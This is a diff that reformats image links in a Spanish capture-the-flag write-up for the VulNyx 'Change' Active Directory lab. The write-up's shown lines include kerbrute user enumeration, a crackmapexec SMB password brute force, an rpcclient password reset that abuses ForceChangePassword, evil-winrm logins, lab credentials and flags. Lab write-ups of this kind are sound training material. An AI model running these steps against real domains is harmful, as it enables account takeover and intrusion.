@@ -2,13 +2,15 @@ ___
 Tags: #AD #smb-bruteforce #kerberos #bloodhound #forcechangepassword #winrm
 ___
 # Change
+
 ## Información General
 
-**- Dificultad:** Fácil
-**- Sistema operativo:** Windows
-**- Vulnerabilidad explotada.**  Missconfigurations
-**- Fecha de resolución:** 06/0572026
-**- Enlace:** [change](https://vulnyx.com/machines/)
+**- Dificultad:** Fácil <br>
+**- Sistema operativo:** Windows <br>
+**- Vulnerabilidad explotada.**  Missconfigurations <br>
+**- Fecha de resolución:** 06/0572026 <br>
+**- Enlace:** [change](https://vulnyx.com/machines/) <br>
+
 ## Reconocimiento
 
 **ARP-SCAN**
@@ -17,8 +19,12 @@ ___
 sudo arp-scan -I eth0 --localnet --ignoredups
 ```
 
-![[Preparación de eCPPTv3/Machine/VulNyx/change/images/arpscan.png]]
+<p align="center"> 
+<img src="images/arpscan.png" width="600" alt="Resultado de Nmap">
+</p>
+
 ## Enumeración
+
 ### Escaneo de puertos abiertos
 
 #### Escaneo de puerto TCP
@@ -70,7 +76,9 @@ La única forma que conseguí un usuario es usando la herramienta **kerbrute**, 
 ./kerbrute_linux_amd64 userenum -d megachange.nyx --dc 192.168.0.110 /usr/share/seclists/Usernames/Names/names.txt
 ```
 
-![[Change - kerbrute.png]]
+<p align="center"> 
+<img src="images/Change - kerbrute.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Luego para conseguir la contraseña del usuario **aldredo** realizo fuerza bruta mediante **crackmapexec**
 
@@ -79,6 +87,7 @@ crackmapexec smb 192.168.0.110 -u 'aldredo' -p '/usr/share/wordlists/rockyou.txt
 ```
 
 La contraseña es **Password1**. Por tanto, quedaría **aldredo**:**Password1**
+
 ## Explotación
 
 El siguiente comando conseguiremos extraer .zip de todo el AD
@@ -103,7 +112,9 @@ Luego subimos .zip en **Quick Upload**, una vez subido nos vamos a **search** y 
 
 El permiso ForceChangePassword significa que el usuario **alfredo** tiene el poder de  cambiar la contraseña al usuario **sysadmin**
 
-![[Change bloodhound.png]]
+<p align="center"> 
+<img src="images/Change bloodhound.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Por tanto usaremos rpcclient para cambiar la contraseña al usuario **sysadmin**
 
@@ -114,13 +125,17 @@ setuserinfo2 sysadmin 23 pass123!!
 
 Luego, en **bloodhound** busco quien forma parte del grupo **Remote Management Users** que es el grupo que permite entrar en la herramienta **evil-winrm**
 
-![[bh sysadmin.png]]
+<p align="center"> 
+<img src="images/bh sysadmin.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 evil-winrm -i 192.168.0.110 -u 'sysadmin' -p 'pass123!!'
 ```
 
-![[flag user.png]]
+<p align="center"> 
+<img src="images/flag user.png" width="600" alt="Resultado de Nmap">
+</p>
 
 flag user: **01c920617c6470cdf46ba5861ce701c2**
 
@@ -135,9 +150,12 @@ evil-winrm -i 192.168.0.110 -u 'administrator' -p 'd0m@in_c0ntr0ll3r'
 type c:\users\administrator\desktop\root.txt
 ```
 
-![[Flag adminç.png]]
+<p align="center"> 
+<img src="images/Flag adminç.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Flag admin: **79bf6f60850f10211c290be19ccf8b95**
+
 ## Conclusión
 
 La máquina **Change** de la plataforma **Vulnyx** me ha parecido una maquina bastante asequible para practica AD, he repasado bastante concepto, esta perfecto para la preparación de la certificación ecpptv3 de Ine Security. 
